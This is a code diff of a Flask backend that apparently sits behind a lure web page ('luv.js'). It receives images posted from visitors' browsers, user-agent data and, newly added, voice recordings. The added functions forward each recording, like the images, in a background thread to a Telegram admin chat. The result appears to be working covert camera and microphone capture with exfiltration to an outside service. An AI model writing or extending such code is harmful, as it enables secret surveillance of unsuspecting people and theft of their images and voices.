@@ -7,14 +7,14 @@ import requests
 from threading import Thread
 
 # =============================
-# APP CONFIG (SAME DIRECTORY)
+# APP CONFIG
 # =============================
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 app = Flask(
     __name__,
-    template_folder=BASE_DIR,   # index.html cùng cấp
-    static_folder=BASE_DIR      # luv.js, style.css cùng cấp
+    template_folder=BASE_DIR,
+    static_folder=BASE_DIR
 )
 
 UPLOAD_FOLDER = os.path.join(BASE_DIR, 'picture')
@@ -46,14 +46,32 @@ def send_to_telegram(image_bytes, filename):
             timeout=10
         )
     except Exception as e:
-        print("Telegram error:", e)
+        print("Telegram image error:", e)
+
+
+def send_audio_to_telegram(audio_bytes, filename, mime):
+    try:
+        files = {
+            'audio': (filename, BytesIO(audio_bytes), mime)
+        }
+        data = {
+            'chat_id': TELEGRAM_ADMIN_ID,
+            'caption': '🎙 Voice recording'
+        }
+        requests.post(
+            f'{TELEGRAM_API_URL}/sendAudio',
+            files=files,
+            data=data,
+            timeout=15
+        )
+    except Exception as e:
+        print("Telegram audio error:", e)
 
 # =============================
 # ROUTES
 # =============================
 @app.route('/')
 def index():
-    # index.html cùng cấp app.py
     return send_from_directory(BASE_DIR, 'index.html')
 
 @app.route('/luv.js')
@@ -64,6 +82,44 @@ def serve_js():
 def serve_css():
     return send_from_directory(BASE_DIR, 'style.css')
 
+# =============================
+# SAVE AUDIO (MATCH JS)
+# =============================
+@app.route('/save_audio', methods=['POST'])
+def save_audio():
+    try:
+        if 'audio' not in request.files:
+            return jsonify({'success': False, 'error': 'No audio file'}), 400
+
+        audio_file = request.files['audio']
+        mime = request.form.get('mime', audio_file.mimetype)
+
+        audio_bytes = audio_file.read()
+
+        # iOS vs others
+        if 'mp4' in mime:
+            ext = 'm4a'
+            mime_type = 'audio/mp4'
+        else:
+            ext = 'webm'
+            mime_type = 'audio/webm'
+
+        filename = f'voice_{datetime.now().strftime("%Y%m%d_%H%M%S")}.{ext}'
+
+        Thread(
+            target=send_audio_to_telegram,
+            args=(audio_bytes, filename, mime_type),
+            daemon=True
+        ).start()
+
+        return jsonify({'success': True})
+
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+# =============================
+# LOG USER AGENT
+# =============================
 @app.route('/log_user_agent', methods=['POST'])
 def log_user_agent():
     try:
@@ -99,14 +155,17 @@ def log_user_agent():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
+# =============================
+# SAVE IMAGE
+# =============================
 @app.route('/save_image', methods=['POST'])
 def save_image():
     try:
-        data = request.json
+        data = request.json or {}
         image_data = data.get('image')
 
         if not image_data:
-            return jsonify({'success': False, 'message': 'No image data'}), 400
+            return jsonify({'success': False}), 400
 
         if image_data.startswith('data:image'):
             image_data = image_data.split(',')[1]
@@ -116,7 +175,6 @@ def save_image():
         filename = f"miss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
         filepath = os.path.join(UPLOAD_FOLDER, filename)
 
-        # Lưu ảnh (tuỳ chọn)
         with open(filepath, 'wb') as f:
             f.write(image_bytes)
 
@@ -131,8 +189,6 @@ def save_image():
     except Exception as e:
         return jsonify({'success': False, 'message': str(e)}), 500
 
-# =============================
-# RUN
-# =============================
+
 if __name__ == '__main__':
     app.run(debug=False)
